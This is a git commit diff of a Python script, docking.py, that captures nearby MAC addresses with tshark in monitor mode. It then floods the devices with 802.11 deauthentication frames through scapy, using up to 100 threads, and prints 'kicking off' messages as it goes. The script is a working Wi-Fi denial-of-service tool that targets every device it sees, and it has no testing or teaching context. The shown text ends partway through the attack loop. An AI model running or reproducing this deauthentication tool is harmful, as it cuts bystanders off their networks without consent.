97f45d810b0ca6e4307edfb0b4f6cc57ab335bfc
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-26 09:04:48 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -3,8 +3,8 @@ import concurrent.futures
 import time
 import subprocess
 import re
-
 def deauth(target_mac, access_point_mac):
+    print("kicking off {} from {}".format(target_mac,access_point_mac))
     interface = "en0"
     packet_count = 100
     interval = 0.1
@@ -15,38 +15,26 @@ def deauth(target_mac, access_point_mac):
         Dot11Deauth()
     )
     sendp(pkt, inter=interval, count=packet_count, verbose=0)
-
 def maccy():
-    # Disconnect from the current network
     disconnect_cmd = "networksetup -setairportpower en0 off"
     subprocess.run(disconnect_cmd, shell=True)
     disconnect_cmd = "networksetup -setairportpower en0 on"
     subprocess.run(disconnect_cmd, shell=True)
-
-    # Run tshark in intercept mode on en0 for 15 seconds
-    tshark_cmd = "tshark -i en0 -I -a duration:15 -T fields -e eth.src -e eth.dst"
+    tshark_cmd = "tshark -i en0 -I -a duration:10"
     tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
-    # Regular expression pattern for MAC addresses
     mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
-
-    # Read tshark output and extract MAC addresses
     mac_addresses = []
     for line in iter(tshark_process.stdout.readline, b''):
         line = line.decode('utf-8')
         mac_matches = re.findall(mac_regex, line)
         if mac_matches:
             mac_addresses.extend(mac_matches)
-
-    # Re-enable the network connection
-    disable_cmd = ["networksetup", "-setnetworkserviceenabled", "en0", "off"]
-    enable_cmd = ["networksetup", "-setnetworkserviceenabled", "en0", "on"]
-    subprocess.run(disable_cmd, check=True)
-    subprocess.run(enable_cmd, check=True)
-
-    for mac in mac_addresses:
+    disconnect_cmd = "networksetup -setairportpower en0 off"
+    subprocess.run(disconnect_cmd, shell=True)
+    disconnect_cmd = "networksetup -setairportpower en0 on"
+    subprocess.run(disconnect_cmd, shell=True)
+    for mac in set(mac_addresses):
         yield mac
-
 with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
     for wifi in maccy():
         for device in maccy():
